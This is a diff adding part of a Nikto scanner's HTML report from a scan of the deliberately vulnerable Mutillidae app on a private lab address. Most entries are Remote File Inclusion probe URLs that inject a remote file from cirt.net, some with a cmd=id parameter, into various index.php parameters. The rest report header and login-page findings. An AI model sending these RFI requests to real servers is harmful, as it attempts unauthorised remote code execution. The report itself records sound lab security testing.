+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?path_to_folder=https://cirt.net/public/rfiinc.txt?cmd=id</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?path_to_folder=https://cirt.net/public/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?path_to_folder=https://cirt.net/public/rfiinc.txt?cmd=id">http://192.168.1.51:80/mutillidae/index.php?path_to_folder=https://cirt.net/public/rfiinc.txt?cmd=id</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?phpbb_root_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?phpbb_root_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?phpbb_root_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?phpbb_root_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?plugin=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?plugin=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?plugin=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?plugin=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?principal=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?principal=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?principal=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?principal=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt?cmd</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt?cmd: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt?cmd">http://192.168.1.51:80/mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt?cmd</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?project=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?project=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?project=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?project=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?repinc=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?repinc=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?repinc=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?repinc=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?section=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?section=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?section=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?section=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?site=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?site=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?site=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?site=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?site_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?site_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?site_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?site_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?styl[top]=https://cirt.net/public/rfiinc.txt??</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?styl[top]=https://cirt.net/public/rfiinc.txt??: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?styl[top]=https://cirt.net/public/rfiinc.txt??">http://192.168.1.51:80/mutillidae/index.php?styl[top]=https://cirt.net/public/rfiinc.txt??</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?template=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?template=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?template=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?template=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?templates_dir=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?templates_dir=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?templates_dir=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?templates_dir=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?theme=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?theme=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?theme=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?theme=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?themepath=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?themepath=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?themepath=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?themepath=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?themesdir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?themesdir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?themesdir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?themesdir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?this_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?this_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?this_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?this_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?txt=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?txt=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?txt=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?txt=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?up=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?up=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?up=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?up=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?url=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?url=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?url=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?url=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?w=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?w=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?w=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?w=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?way=https://cirt.net/public/rfiinc.txt??????????????</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?way=https://cirt.net/public/rfiinc.txt??????????????: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?way=https://cirt.net/public/rfiinc.txt??????????????">http://192.168.1.51:80/mutillidae/index.php?way=https://cirt.net/public/rfiinc.txt??????????????</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/login.php</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/login.php: Admin login page/section found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/login.php">http://192.168.1.51:80/mutillidae/login.php</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/'>https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</a></td>
+  </tr>
+</table>
+
+<div>
+<p></p>
+<table class="headerTable">
+ <tr>
+  <td>Host Summary</td>
+ </tr>
+</table>
+<table  class="dataTable">
+ <tr>
+  <td class="column-head">Start Time</td>
+  <td>2026-08-19 02:28:18</td>
+ </tr>
+ <tr>
+  <td class="column-head">End Time</td>
+  <td>2026-08-19 02:34:59</td>
+ </tr>
+ <tr>
+  <td class="column-head">Elapsed Time</td>
+  <td>401 seconds</td>
+ </tr>
+ <tr>
+  <td class="column-head">Statistics</td>
+  <td>8102 requests, 16 errors, 157 findings</td>
+ </tr>
+</table>
+</div>
+<p></p>
+
+<p></p>
+<table class="headerTable">
+  <tr>
+    <td>Scan Summary</td>
+  </tr>
+</table>
+<table class="dataTable">
+  <tr>
+    <td class="column-head">Software Details</td>
+    <td><a href="http://cirt.net/">Nikto 2.6.0</a></td>
+  <tr>
+    <td class="column-head">CLI Options</td>
+    <td>-h http://192.168.1.51/mutillidae/ --Format htm -o nikto.html</td>
+  </tr>
+  <tr>
+    <td class="column-head">Hosts Tested</td>
+    <td>1</td>
+  </tr>
+  <tr>
+    <td class="column-head">Start Time</td>
+    <td>Wed Aug 19 02:28:15 2026</td>
+  </tr>
+  <tr>
+    <td class="column-head">End Time</td>
+    <td>Wed Aug 19 02:34:59 2026</td>
+  </tr>
+  <tr>
+    <td class="column-head">Elapsed Time</td>
+    <td>404 seconds</td>
+  </tr>
+</table>
+<p></p>
